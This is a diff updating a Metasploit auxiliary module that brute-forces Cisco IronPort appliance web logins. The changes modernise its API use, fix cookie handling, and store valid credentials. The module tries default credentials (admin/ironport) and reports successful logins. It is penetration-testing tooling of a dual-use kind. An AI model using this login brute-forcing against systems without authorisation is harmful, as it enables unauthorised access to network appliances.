@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -24,16 +22,16 @@ class Metasploit3 < Msf::Auxiliary
         [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
         ],
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' => { 'SSL' => true }
     ))
 
     register_options(
       [
         Opt::RPORT(443),
-        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
         OptString.new('USERNAME', [true, "A specific username to authenticate as", "admin"]),
         OptString.new('PASSWORD', [true, "A specific password to authenticate with", "ironport"])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -60,10 +58,13 @@ class Metasploit3 < Msf::Auxiliary
         'uri'       => '/',
         'method'    => 'GET'
       })
-      print_good("#{rhost}:#{rport} - Server is responsive...")
+      if res
+        print_good("#{rhost}:#{rport} - Server is responsive...")
+        return true
+      end
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      return
     end
+    false
   end
 
   #
@@ -77,15 +78,15 @@ class Metasploit3 < Msf::Auxiliary
         'method'    => 'GET'
       })
 
-      if (res and res.headers['Set-Cookie'])
+      if res && res.get_cookies
 
-        cookie = res.headers['Set-Cookie'].split('; ')[0]
+        cookie = res.get_cookies
 
         res = send_request_cgi(
         {
           'uri'       => "/help/wwhelp/wwhimpl/common/html/default.htm",
           'method'    => 'GET',
-          'cookie'	   => '#{cookie}'
+          'cookie'	   => cookie
         })
 
         if (res and res.code == 200 and res.body.include?('Cisco IronPort AsyncOS'))
@@ -114,6 +115,10 @@ class Metasploit3 < Msf::Auxiliary
       end
   end
 
+  def service_details
+    super.merge({service_name: 'Cisco IronPort Appliance'})
+  end
+
   #
   # Brute-force the login page
   #
@@ -135,20 +140,10 @@ class Metasploit3 < Msf::Auxiliary
           }
       })
 
-      if (res and res.headers['Set-Cookie'].include?('authenticated='))
+      if res and res.get_cookies.include?('authenticated=')
         print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
 
-        report_hash = {
-          :host   => rhost,
-          :port   => rport,
-          :sname  => 'Cisco IronPort Appliance',
-          :user   => user,
-          :pass   => pass,
-          :active => true,
-          :type => 'password'
-        }
-
-        report_auth_info(report_hash)
+        store_valid_credential(user: user, private: pass, proof: res.get_cookies.inspect)
         return :next_user
 
       else
